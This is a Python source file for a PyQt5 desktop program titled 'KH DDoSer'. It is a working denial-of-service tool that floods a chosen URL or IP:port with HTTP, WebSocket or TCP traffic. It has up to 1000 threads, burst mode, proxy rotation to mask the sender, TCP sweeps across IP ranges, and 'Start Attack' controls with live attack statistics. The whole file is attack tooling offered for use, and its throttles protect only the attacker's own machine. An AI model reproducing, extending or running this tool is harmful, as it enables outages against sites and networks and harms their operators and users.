import sys
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLabel, QLineEdit, QComboBox, QCheckBox, QGroupBox,
    QTextEdit, QTabWidget, QSpinBox, QDoubleSpinBox, QSlider, QFileDialog, QMessageBox
)
from PyQt5.QtCore import Qt, QTimer, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QColor, QPalette, QBrush
import json
from collections import defaultdict
import time
import psutil
import asyncio
import aiohttp
import websockets
import socket
import threading
import random
import os

# Globals
running = False
stats = defaultdict(int)
response_times = []
proxies = []
ips = []
threads = [] # For TCP threads
log_lines = []

# Limits
cpu_limit = 90
ram_limit = 90
bandwidth_limit = 10 * 1024 * 1024  # 10 MB/s
bytes_sent = 0
last_bandwidth_check = time.time()

# Define worker threads for long-running operations (to keep GUI responsive)
class AttackWorker(QThread):
    log_signal = pyqtSignal(str)
    stats_update_signal = pyqtSignal(dict)
    response_time_update_signal = pyqtSignal(list)

    def __init__(self, protocol, url, method, headers, data, delay, thread_count, use_proxies, burst_mode, burst_count, ip_range_config, timeout_value):
        super().__init__()
        self.protocol = protocol
        self.url = url
        self.method = method
        self.headers = headers
        self.data = data
        self.delay = delay
        self.thread_count = thread_count
        self.use_proxies = use_proxies
        self.burst_mode = burst_mode
        self.burst_count = burst_count
        self.ip_range_config = ip_range_config
        self.timeout_value = timeout_value # Pass timeout value to worker

    def run(self):
        global running, stats, response_times, bytes_sent, last_bandwidth_check, threads
        running = True
        stats.clear()
        response_times.clear()

        def internal_log(msg):
            self.log_signal.emit(msg)

        async def send_http_worker(session, url, method, headers, data, delay, use_proxies):
            global bytes_sent, last_bandwidth_check # <-- IMPORTANT CHANGE HERE
            while running:
                if psutil.cpu_percent() > cpu_limit or psutil.virtual_memory().percent > ram_limit:
                    await asyncio.sleep(1)
                    continue
                if time.time() - last_bandwidth_check >= 1:
                    bytes_sent = 0
                    last_bandwidth_check = time.time()
                if bytes_sent >= bandwidth_limit:
                    await asyncio.sleep(0.5)
                    continue
                
                proxy = random.choice(proxies) if (proxies and use_proxies) else None
                proxy_cfg = f"http://{proxy}" if proxy else None
                
                try:
                    start = time.time()
                    # Use aiohttp.request for generic method handling
                    async with session.request(method, url, headers=headers, json=data if method == "POST" else None, proxy=proxy_cfg, timeout=self.timeout_value) as resp:
                        content = await resp.read()
                    elapsed = time.time() - start
                    response_times.append(elapsed)
                    stats[str(resp.status)[0] + "xx"] += 1
                    bytes_sent += len(content)
                    internal_log(f"HTTP {method} {url} - {resp.status} - {elapsed:.2f}s")
                except Exception as e:
                    stats["error"] += 1
                    internal_log(f"HTTP Error: {e}")
                self.stats_update_signal.emit(dict(stats))
                self.response_time_update_signal.emit(list(response_times))
                await asyncio.sleep(delay)

        async def send_websocket_worker(uri, delay):
            while running:
                try:
                    async with websockets.connect(uri, timeout=self.timeout_value) as ws:
                        await ws.send("ping")
                        await ws.recv() # Wait for a response to consider it successful
                        stats["ws"] += 1
                        internal_log(f"WebSocket ping sent/received")
                except Exception as e:
                    stats["ws_error"] += 1
                    internal_log(f"WebSocket Error: {e}")
                self.stats_update_signal.emit(dict(stats))
                await asyncio.sleep(delay)

        def send_tcp_worker(ip, port, count): # Pass count for burst mode
            sent = 0
            while running and (count == 0 or sent < count): # Check 'running' and 'count'
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(self.timeout_value)
                    s.connect((ip, int(port)))
                    s.send(b"ping")
                    s.close()
                    stats["tcp"] += 1
                    internal_log(f"TCP ping sent to {ip}:{port}")
                    sent += 1
                except Exception as e:
                    stats["tcp_error"] += 1
                    internal_log(f"TCP Error {ip}:{port} - {e}")
                self.stats_update_signal.emit(dict(stats))
                time.sleep(0.01)

        def scan_ip_range_worker(base_ip, start, end, port, count_per_ip):
            for i in range(start, end + 1):
                if not running: return
                ip = f"{base_ip}.{i}"
                for _ in range(count_per_ip if count_per_ip > 0 else 1): # Burst per IP
                    if not running: return
                    send_tcp_worker(ip, port, 1) # Send 1 ping per iteration of scan
                    time.sleep(0.01) # Small delay to not overwhelm

        # Clear existing threads before starting new ones for TCP
        for t in threads:
            if t.is_alive():
                t.join(timeout=0.1) # Try to join, don't block
        threads = [] # Clear previous threads

        if self.protocol == "HTTP":
            asyncio.run(self.start_http_worker(self.url, self.method, self.headers, self.data, self.delay, self.thread_count, self.use_proxies, self.burst_mode, self.burst_count, send_http_worker))
        elif self.protocol == "WebSocket":
            asyncio.run(self.start_websocket_worker(self.url, self.delay, self.thread_count, self.burst_mode, self.burst_count, send_websocket_worker))
        elif self.protocol == "TCP":
            if self.ip_range_config:
                # The IP range scan will use its own internal TCP sending logic
                t = threading.Thread(target=scan_ip_range_worker, args=(
                    self.ip_range_config['base_ip'], self.ip_range_config['start_ip'],
                    self.ip_range_config['end_ip'], self.ip_range_config['port'],
                    self.ip_range_config['count_per_ip']
                ), daemon=True)
                threads.append(t)
                t.start()
            else:
                for _ in range(self.thread_count):
                    try:
                        ip, port_str = self.url.split(":")
                        port = int(port_str)
                        t = threading.Thread(target=send_tcp_worker, args=(ip, port, self.burst_count if self.burst_mode else 0), daemon=True)
                        threads.append(t)
                        t.start()
                    except ValueError:
                        internal_log("Error: TCP URL/Port format invalid. Use IP:Port (e.g., 192.168.1.1:80).")
                        running = False
                        return

            # Keep the main attack worker thread alive while TCP threads are running
            while running and any(t.is_alive() for t in threads):
                time.sleep(0.5)

    async def start_http_worker(self, url, method, headers, data, delay, thread_count, use_proxies, burst_mode, burst_count, worker_func):
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(thread_count):
                if burst_mode and burst_count > 0: # Only burst if burst_count > 0
                    for _ in range(burst_count):
                        tasks.append(worker_func(session, url, method, headers, data, delay, use_proxies))
                else:
                    tasks.append(worker_func(session, url, method, headers, data, delay, use_proxies))
            if tasks: # Only gather if there are tasks
                await asyncio.gather(*tasks)

    async def start_websocket_worker(self, url, delay, thread_count, burst_mode, burst_count, worker_func):
        tasks = []
        for _ in range(thread_count):
            if burst_mode and burst_count > 0:
                for _ in range(burst_count):
                    tasks.append(worker_func(url, delay))
            else:
                tasks.append(worker_func(url, delay))
        if tasks: # Only gather if there are tasks
            await asyncio.gather(*tasks)


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("KH DDoSer")
        self.setGeometry(100, 100, 660, 730) # Increased size for more content

        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QHBoxLayout(self.central_widget)

        self.apply_gta_style()

        self.setup_ui()
        self.attack_worker = None
        self.resource_timer = QTimer(self)
        self.resource_timer.timeout.connect(self.update_resource_usage)
        # self.resource_timer.start(1000) # Start only when attack begins

        self.graph_timer = QTimer(self)
        self.graph_timer.timeout.connect(self.update_graph)
        # self.graph_timer.start(1000) # Start only when attack begins

        self.log_message("Application started.")

    def apply_gta_style(self):
        # Dark theme with accents
        palette = self.palette()
        palette.setColor(QPalette.Window, QColor(0, 0, 0)) # Pure black background
        palette.setColor(QPalette.WindowText, QColor(255, 255, 255)) # White text
        palette.setColor(QPalette.Base, QColor(20, 20, 20)) # Input field background, slightly off black
        palette.setColor(QPalette.AlternateBase, QColor(30, 30, 30))
        palette.setColor(QPalette.ToolTipBase, Qt.white)
        palette.setColor(QPalette.ToolTipText, Qt.white)
        palette.setColor(QPalette.Text, Qt.white) # Default text color
        palette.setColor(QPalette.Button, QColor(0, 128, 0)) # Green button
        palette.setColor(QPalette.ButtonText, Qt.white) # Button text
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Link, QColor(42, 130, 218)) # Link color
        palette.setColor(QPalette.Highlight, QColor(0, 120, 215)) # Selection highlight
        palette.setColor(QPalette.HighlightedText, Qt.black)
        self.setPalette(palette)

        # Stylesheet for more granular control and "mod menu" look
        self.setStyleSheet("""
            QMainWindow {
                background-color: #000000; /* Pure black for the main window */
                border: 2px solid #00ff00; /* Slightly thinner green border */
            }
            QWidget {
                background-color: #1a1a1a; /* Darker background for inner widgets */
                color: #ffffff; /* White text */
                font-family: 'Consolas', 'Monospace'; /* Monospace font */
                font-size: 9pt; /* Smaller font */
            }
            QTabWidget::pane {
                border: 1px solid #00ff00; /* Thinner green border for tabs */
                top: -1px;
                background: #2b2b2b;
            }
            QTabBar::tab {
                background: #333333; /* Tab background */
                border: 1px solid #00ff00; /* Thinner border */
                border-bottom-color: #00ff00; /* Same as pane border */
                border-top-left-radius: 4px; /* Less rounded */
                border-top-right-radius: 4px;
                min-width: 8ex; /* Slightly narrower tabs */
                padding: 4px; /* Smaller padding */
                color: #ffffff;
                font-size: 9pt; /* Consistent font size */
            }
            QTabBar::tab:selected {
                background: #00ff00; /* Selected tab green */
                color: #000000; /* Black text on selected tab */
                font-weight: bold;
            }
            QPushButton {
                background-color: #008000; /* Green button */
                color: white;
                border: 1px solid #00ff00; /* Thinner green border */
                padding: 6px 12px; /* Smaller padding */
                border-radius: 5px; /* Less rounded buttons */
                min-width: 80px; /* Narrower buttons */
                font-size: 9pt; /* Consistent font size */
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #009900; /* Lighter green on hover */
            }
            QPushButton:pressed {
                background-color: #006600; /* Darker green on press */
            }
            QLineEdit, QTextEdit {
                background-color: #1a1a1a; /* Dark input fields */
                border: 1px solid #00aa00; /* Brighter green border */
                padding: 4px; /* Smaller padding */
                border-radius: 3px;
                color: #00ff00; /* Green text in input fields */
                font-size: 9pt; /* Consistent font size */
            }
            QComboBox {
                background-color: #1a1a1a;
                border: 1px solid #00aa00;
                padding: 4px; /* Smaller padding */
                border-radius: 3px;
                color: #00ff00;
                font-size: 9pt;
            }
            QComboBox::drop-down {
                border: 0px;
                subcontrol-origin: padding;
                subcontrol-position: top right;
                width: 15px; /* Slightly narrower dropdown arrow area */
            }
            /* QComboBox::down-arrow { image: url(path/to/your/arrow_down_green.png); } */

            QCheckBox {
                spacing: 3px; /* Smaller spacing */
                color: #00ff00; /* Green checkbox label */
                font-size: 9pt;
            }
            QCheckBox::indicator {
                width: 14px; /* Smaller checkbox indicator */
                height: 14px;
                border: 1px solid #00ff00; /* Thinner border */
                background-color: #1a1a1a;
                border-radius: 2px;
            }
            QCheckBox::indicator:checked {
                background-color: #00ff00;
            }
            QSpinBox, QDoubleSpinBox {
                color: #00ff00;
                background-color: #1a1a1a;
                border: 1px solid #00aa00;
                padding: 3px; /* Smaller padding */
                border-radius: 3px;
                font-size: 9pt;
            }
            QSlider::groove:horizontal {
                border: 1px solid #00ff00;
                height: 6px; /* Thinner groove */
                background: #333333;
                margin: 1px 0; /* Smaller margin */
                border-radius: 3px;
            }
            QSlider::handle:horizontal {
                background: #00ff00;
                border: 1px solid #00aa00;
                width: 14px; /* Smaller handle */
                margin: -4px 0; /* Adjusted margin for thinner groove */
                border-radius: 7px;
            }
            QLabel {
                color: #00ff00; /* Green labels */
                font-size: 9pt;
            }
            QGroupBox {
                border: 1px solid #00ff00; /* Thinner green border for group boxes */
                margin-top: 10px; /* Smaller margin */
                font-weight: bold;
                color: #00ff00;
                font-size: 10pt; /* Smaller group box title */
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding: 0 3px; /* Smaller padding */
                background-color: #1a1a1a; /* Darker background for title */
            }
            #log_text { /* Specific ID for log text */
                background-color: #000000; /* Pure black for log */
                color: #00ff00; /* Green log text */
                border: 1px solid #00aa00;
                padding: 3px; /* Smaller padding */
                font-size: 8pt; /* Even smaller font for log for more entries */
            }
            #status_label {
                font-size: 10pt; /* Smaller status label */
                font-weight: bold;
            }
            #resource_label {
                font-size: 9pt;
            }
        """)

    def setup_ui(self):
        # Left Panel (Controls)
        left_panel = QVBoxLayout()
        self.main_layout.addLayout(left_panel, 2) # 2 parts of width

        # Attack Configuration Group
        attack_config_group = QGroupBox("Attack Configuration")
        attack_config_layout = QVBoxLayout()
        attack_config_group.setLayout(attack_config_layout)
        left_panel.addWidget(attack_config_group)

        # Protocol
        protocol_layout = QHBoxLayout()
        protocol_layout.addWidget(QLabel("Protocol:"))
        self.protocol_var = QComboBox()
        self.protocol_var.addItems(["HTTP", "WebSocket", "TCP"])
        self.protocol_var.currentIndexChanged.connect(self.on_protocol_changed)
        protocol_layout.addWidget(self.protocol_var)
        attack_config_layout.addLayout(protocol_layout)

        # URL/IP:Port
        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("URL/IP:Port:"))
        self.url_entry = QLineEdit("http://localhost:8080")
        url_layout.addWidget(self.url_entry)
        attack_config_layout.addLayout(url_layout)

        # Method (HTTP only)
        method_layout = QHBoxLayout()
        method_layout.addWidget(QLabel("Method:"))
        self.method_var = QComboBox()
        self.method_var.addItems(["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]) # Added more methods
        method_layout.addWidget(self.method_var)
        attack_config_layout.addLayout(method_layout)

        # Delay
        delay_layout = QHBoxLayout()
        delay_layout.addWidget(QLabel("Delay (s):"))
        self.delay_entry = QDoubleSpinBox() # Changed to QDoubleSpinBox
        self.delay_entry.setRange(0.0, 60.0)
        self.delay_entry.setValue(0.1)
        self.delay_entry.setSingleStep(0.1)
        delay_layout.addWidget(self.delay_entry)
        attack_config_layout.addLayout(delay_layout)

        # Threads
        threads_layout = QHBoxLayout()
        threads_layout.addWidget(QLabel("Threads:"))
        self.threads_entry = QSpinBox()
        self.threads_entry.setRange(1, 1000)
        self.threads_entry.setValue(8)
        threads_layout.addWidget(self.threads_entry)
        attack_config_layout.addLayout(threads_layout)

        # Timeout
        timeout_layout = QHBoxLayout()
        timeout_layout.addWidget(QLabel("Timeout (s):"))
        self.timeout_val = QSpinBox()
        self.timeout_val.setRange(1, 60)
        self.timeout_val.setValue(5)
        timeout_layout.addWidget(self.timeout_val)
        attack_config_layout.addLayout(timeout_layout)

        # Proxy
        proxy_layout = QHBoxLayout()
        self.proxy_toggle = QCheckBox("Use Proxies")
        self.proxy_toggle.setChecked(False)
        proxy_layout.addWidget(self.proxy_toggle)
        self.load_proxy_btn = QPushButton("Load Proxies")
        self.load_proxy_btn.clicked.connect(self.load_proxy_file)
        proxy_layout.addWidget(self.load_proxy_btn)
        attack_config_layout.addLayout(proxy_layout)

        # Attack Mode (Burst/Continuous)
        mode_layout = QHBoxLayout()
        mode_layout.addWidget(QLabel("Attack Mode:"))
        self.mode_var = QComboBox()
        self.mode_var.addItems(["Continuous", "Burst"])
        self.mode_var.currentIndexChanged.connect(self.on_mode_changed)
        mode_layout.addWidget(self.mode_var)
        attack_config_layout.addLayout(mode_layout)

        self.burst_entry = QSpinBox()
        self.burst_entry.setRange(1, 10000)
        self.burst_entry.setValue(100)
        self.burst_entry.setDisabled(True) # Disabled by default
        attack_config_layout.addWidget(self.burst_entry)

        # IP Range Scan (TCP only)
        self.ip_range_group = QGroupBox("IP Range Scan (TCP Only)")
        self.ip_range_group_layout = QVBoxLayout()
        self.ip_range_group.setLayout(self.ip_range_group_layout)
        attack_config_layout.addWidget(self.ip_range_group)
        self.ip_range_group.setCheckable(True)
        self.ip_range_group.setChecked(False)
        self.ip_range_group.toggled.connect(self.toggle_ip_range_scan)
        self.ip_range_group.setDisabled(True) # Initially disabled until TCP is selected

        ip_base_layout = QHBoxLayout()
        ip_base_layout.addWidget(QLabel("Base IP (e.g., 192.168.1):"))
        self.ip_range_base = QLineEdit("192.168.1")
        ip_base_layout.addWidget(self.ip_range_base)
        self.ip_range_group_layout.addLayout(ip_base_layout)

        ip_start_layout = QHBoxLayout()
        ip_start_layout.addWidget(QLabel("Start (0-255):"))
        self.ip_range_start = QSpinBox()
        self.ip_range_start.setRange(0, 255)
        self.ip_range_start.setValue(1)
        ip_start_layout.addWidget(self.ip_range_start)
        self.ip_range_group_layout.addLayout(ip_start_layout)

        ip_end_layout = QHBoxLayout()
        ip_end_layout.addWidget(QLabel("End (0-255):"))
        self.ip_range_end = QSpinBox()
        self.ip_range_end.setRange(0, 255)
        self.ip_range_end.setValue(255)
        ip_end_layout.addWidget(self.ip_range_end)
        self.ip_range_group_layout.addLayout(ip_end_layout)

        # Headers and POST Data
        headers_group = QGroupBox("Headers (JSON)")
        headers_layout = QVBoxLayout()
        headers_group.setLayout(headers_layout)
        self.headers_text = QTextEdit()
        self.headers_text.setObjectName("headers_text") # Set object name for potential CSS
        self.headers_text.setPlaceholderText('{"Content-Type": "application/json"}')
        headers_layout.addWidget(self.headers_text)
        left_panel.addWidget(headers_group)

        data_group = QGroupBox("POST Data (JSON)")
        data_layout = QVBoxLayout()
        data_group.setLayout(data_layout)
        self.data_text = QTextEdit()
        self.data_text.setObjectName("data_text") # Set object name for potential CSS
        self.data_text.setPlaceholderText('{"key": "value"}')
        data_layout.addWidget(self.data_text)
        left_panel.addWidget(data_group)


        # Right Panel (Status, Log, Graph)
        right_panel = QVBoxLayout()
        self.main_layout.addLayout(right_panel, 3) # 3 parts of width

        # Status & Resource Usage
        status_resource_layout = QHBoxLayout()
        self.status_label = QLabel("Status: Inactive")
        self.status_label.setObjectName("status_label") # For specific CSS
        self.status_label.setFont(QFont("Consolas", 13, QFont.Bold)) # Larger font for status
        self.status_label.setStyleSheet("color: #00ff00;") # Green status
        status_resource_layout.addWidget(self.status_label)

        self.resource_label = QLabel("CPU: --% | RAM: --%")
        self.resource_label.setObjectName("resource_label") # For specific CSS
        self.resource_label.setFont(QFont("Consolas", 11))
        status_resource_layout.addWidget(self.resource_label, alignment=Qt.AlignRight)
        right_panel.addLayout(status_resource_layout)

        # Tabs for Log and Statistics/Graph
        self.tab_widget = QTabWidget()
        right_panel.addWidget(self.tab_widget)

        # Log Tab
        log_tab = QWidget()
        log_tab_layout = QVBoxLayout(log_tab)
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setObjectName("log_text") # For specific CSS
        log_tab_layout.addWidget(self.log_text)
        self.tab_widget.addTab(log_tab, "Attack Log")

        # Statistics & Graph Tab
        stats_tab = QWidget()
        stats_tab_layout = QVBoxLayout(stats_tab)
        self.stats_label = QLabel("")
        self.stats_label.setFont(QFont("Consolas", 11))
        stats_tab_layout.addWidget(self.stats_label)

        # Matplotlib Graph (Requires embedding matplotlib into PyQt)
        from matplotlib.figure import Figure
        from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas
        import matplotlib.pyplot as plt

        # Adjust default matplotlib style for dark theme
        plt.style.use('dark_background')
        plt.rcParams['axes.facecolor'] = '#1a1a1a' # Darker background for plot area
        plt.rcParams['figure.facecolor'] = '#1a1a1a' # Darker background for figure
        plt.rcParams['text.color'] = '#00ff00' # Green text
        plt.rcParams['axes.labelcolor'] = '#00ff00'
        plt.rcParams['xtick.color'] = '#00ff00'
        plt.rcParams['ytick.color'] = '#00ff00'
        plt.rcParams['grid.color'] = '#006600' # Darker green grid
        plt.rcParams['grid.alpha'] = 0.5
        plt.rcParams['axes.edgecolor'] = '#00ff00'


        self.figure = Figure(facecolor='#1a1a1a') # Background for graph area
        self.ax = self.figure.add_subplot(111)
        self.canvas = FigureCanvas(self.figure)
        stats_tab_layout.addWidget(self.canvas)

        self.tab_widget.addTab(stats_tab, "Statistics")

        # Bottom Buttons
        bottom_buttons_layout = QHBoxLayout()
        left_panel.addLayout(bottom_buttons_layout) # Add to left panel for better grouping

        self.start_btn = QPushButton("Start Attack")
        self.start_btn.clicked.connect(self.start_attack)
        bottom_buttons_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("Stop Attack")
        self.stop_btn.clicked.connect(self.stop_attack)
        bottom_buttons_layout.addWidget(self.stop_btn)

        self.load_ips_btn = QPushButton("Load IPs")
        self.load_ips_btn.clicked.connect(self.load_ip_file)
        bottom_buttons_layout.addWidget(self.load_ips_btn)

        self.on_protocol_changed() # Initialize UI elements based on default protocol

    def log_message(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        line = f"[{timestamp}] {msg}"
        log_lines.append(line) # Keep global log_lines
        self.log_text.append(line)
        self.log_text.verticalScrollBar().setValue(self.log_text.verticalScrollBar().maximum()) # Auto-scroll

    def update_resource_usage(self):
        if not running:
            return
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        self.resource_label.setText(f"CPU: {cpu}% | RAM: {ram}%")

    def update_graph(self):
        # Update statistics label
        stats_str = "\n".join([f"{k}: {v}" for k, v in stats.items()])
        self.stats_label.setText(f"Statistics:\n{stats_str}")

        # Update bar graph
        self.ax.clear()
        if stats:
            labels = list(stats.keys())
            values = [stats[k] for k in labels]
            self.ax.bar(labels, values, color="#00ff00") # Green bars
            self.ax.set_title("Attack Statistics", color="#00ff00")
            self.ax.tick_params(axis='x', colors='#00ff00')
            self.ax.tick_params(axis='y', colors='#00ff00')
        else:
            self.ax.set_title("Attack Statistics (No Data)", color="#00ff00")
            self.ax.tick_params(axis='x', colors='#00ff00')
            self.ax.tick_params(axis='y', colors='#00ff00')

        self.ax.set_facecolor('#1a1a1a') # Background for graph area
        self.figure.tight_layout() # Adjust layout
        self.canvas.draw()

    def on_protocol_changed(self):
        protocol = self.protocol_var.currentText()
        is_http = (protocol == "HTTP")
        is_tcp = (protocol == "TCP")

        self.method_var.setDisabled(not is_http)
        self.headers_text.setDisabled(not is_http)
        self.data_text.setDisabled(not is_http)
        self.proxy_toggle.setDisabled(not is_http) # Proxies typically for HTTP
        self.load_proxy_btn.setDisabled(not is_http)

        self.ip_range_group.setDisabled(not is_tcp)
        # When switching away from TCP, uncheck and disable ip_range_group's internal widgets
        if not is_tcp:
            self.ip_range_group.setChecked(False)
            self.toggle_ip_range_scan(False) # Ensure internal widgets are disabled

        # Update URL placeholder based on protocol
        if is_http:
            self.url_entry.setPlaceholderText("http://example.com:8080/path")
        elif is_tcp:
            self.url_entry.setPlaceholderText("192.168.1.1:80")
        else: # WebSocket
            self.url_entry.setPlaceholderText("ws://example.com/ws")

    def on_mode_changed(self):
        is_burst = (self.mode_var.currentText() == "Burst")
        self.burst_entry.setDisabled(not is_burst)

    def toggle_ip_range_scan(self, checked):
        # Enable/disable sub-widgets of ip_range_group based on its checked state
        # Iterate over widgets in the layout directly
        for i in range(self.ip_range_group_layout.count()):
            item = self.ip_range_group_layout.itemAt(i)
            if item:
                widget = item.widget()
                if widget:
                    widget.setDisabled(not checked)
                elif item.layout(): # If it's a nested layout
                    for j in range(item.layout().count()):
                        nested_item = item.layout().itemAt(j)
                        if nested_item and nested_item.widget():
                            nested_item.widget().setDisabled(not checked)

    def start_attack(self):
        global running
        if running:
            self.log_message("Attack is already active. Stop it first.")
            QMessageBox.warning(self, "Attack Active", "An attack is already running. Please stop it before starting a new one.")
            return

        protocol = self.protocol_var.currentText()
        url = self.url_entry.text().strip() # Strip whitespace
        method = self.method_var.currentText()
        delay = float(self.delay_entry.value())
        thread_count = int(self.threads_entry.value())
        use_proxies = self.proxy_toggle.isChecked()
        burst_mode = (self.mode_var.currentText() == "Burst")
        burst_count = int(self.burst_entry.value()) if burst_mode else 0
        timeout_value = int(self.timeout_val.value()) # Get timeout value

        headers = {}
        data = {}
        try:
            header_text = self.headers_text.toPlainText().strip()
            if header_text:
                headers = json.loads(header_text)
            else:
                headers = {}
        except json.JSONDecodeError:
            self.log_message("Invalid JSON in headers. Check the format.")
            QMessageBox.critical(self, "JSON Error", "Invalid JSON in the Headers field. Please correct it.")
            return

        try:
            data_text = self.data_text.toPlainText().strip()
            if data_text:
                data = json.loads(data_text)
            else:
                data = {}
        except json.JSONDecodeError:
            self.log_message("Invalid JSON in POST data. Check the format.")
            QMessageBox.critical(self, "JSON Error", "Invalid JSON in the POST Data field. Please correct it.")
            return

        if not url:
            QMessageBox.warning(self, "Input Error", "URL/IP:Port cannot be empty.")
            return

        # Clear logs and stats before starting
        self.log_text.clear()
        stats.clear()
        response_times.clear()
        self.update_graph() # Clear graph visually

        self.status_label.setText("Status: Active...")
        self.resource_timer.start(1000)
        self.graph_timer.start(1000)

        ip_range_config = None
        if protocol == "TCP" and self.ip_range_group.isChecked():
            try:
                base_ip = self.ip_range_base.text().strip()
                # Basic validation for base_ip (e.g., check for 3 octets)
                base_ip_parts = base_ip.split('.')
                if not (len(base_ip_parts) == 3 and all(0 <= int(x) <= 255 for x in base_ip_parts)):
                     raise ValueError("Invalid Base IP format. Use X.Y.Z (e.g., 192.168.1).")
                start_ip = int(self.ip_range_start.value())
                end_ip = int(self.ip_range_end.value())

                # Try to extract port from URL/IP:Port input
                if ":" in url:
                    port = int(url.split(":")[1])
                else:
                    QMessageBox.warning(self, "Input Error", "For TCP IP Range Scan, please provide a port in the URL/IP:Port field (e.g., 192.168.1.1:80). Defaulting to port 80.")
                    port = 80 # Default port if not provided

                count_per_ip = burst_count if burst_mode else 1 # If not burst, send at least 1 per IP

                ip_range_config = {
                    'base_ip': base_ip,
                    'start_ip': start_ip,
                    'end_ip': end_ip,
                    'port': port,
                    'count_per_ip': count_per_ip
                }
            except (ValueError, IndexError) as e:
                QMessageBox.critical(self, "Input Error", f"Invalid IP Range or TCP URL/Port format: {e}. Ensure URL/IP:Port is in IP:Port format (e.g., 192.168.1.1:80) for TCP, and Base IP is X.Y.Z")
                self.stop_attack()
                return

        # Start the attack in a worker thread
        self.attack_worker = AttackWorker(protocol, url, method, headers, data, delay,
                                          thread_count, use_proxies, burst_mode, burst_count,
                                          ip_range_config, timeout_value) # Pass timeout
        self.attack_worker.log_signal.connect(self.log_message)
        self.attack_worker.stats_update_signal.connect(self.update_stats_from_worker)
        self.attack_worker.response_time_update_signal.connect(self.update_response_times_from_worker)
        self.attack_worker.start()
        self.log_message(f"Attack started ({protocol} on {url}) with {thread_count} threads.")

    def update_stats_from_worker(self, new_stats):
        global stats
        stats.update(new_stats) # Update global stats

    def update_response_times_from_worker(self, new_response_times):
        global response_times
        response_times[:] = new_response_times # Update global response_times

    def stop_attack(self):
        global running, threads
        if not running:
            self.log_message("Attack is not active.")
            return

        running = False
        if self.attack_worker and self.attack_worker.isRunning():
            self.attack_worker.terminate() # Force termination for quick stop
            self.attack_worker.wait(2000) # Wait up to 2 seconds for clean termination
            if self.attack_worker.isRunning():
                self.log_message("Warning: Attack worker thread has not ended successfully")
        
        # Ensure all individual TCP threads are stopped if they were started
        for t in threads:
            if t.is_alive():
                # For daemon threads, simply setting 'running = False' should be enough,
                # but a small join can help ensure they notice the flag change.
                t.join(timeout=0.1) 
        threads = [] # Clear the list of threads

        self.status_label.setText("Status: Ended.")
        self.resource_timer.stop()
        self.graph_timer.stop()
        self.log_message("Attack ended.")

    def load_proxy_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Load Proxies", "", "Text Files (*.txt);;All Files (*)")
        if path:
            try:
                with open(path, 'r') as f:
                    proxies[:] = [line.strip() for line in f if line.strip()]
                self.log_message(f"'{len(proxies)}' proxies loaded from '{path}'")
            except Exception as e:
                self.log_message(f"Error loading proxies: {e}")
                QMessageBox.critical(self, "Load Error", f"Error loading proxies: {e}")

    def load_ip_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Load IPs", "", "Text Files (*.txt);;All Files (*)")
        if path:
            try:
                with open(path, 'r') as f:
                    ips[:] = [line.strip() for line in f if line.strip()]
                self.log_message(f"'{len(ips)}' IPs loaded from '{path}'")
            except Exception as e:
                self.log_message(f"Error loading IPs: {e}")
                QMessageBox.critical(self, "Load Error", f"Error loading IPs: {e}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())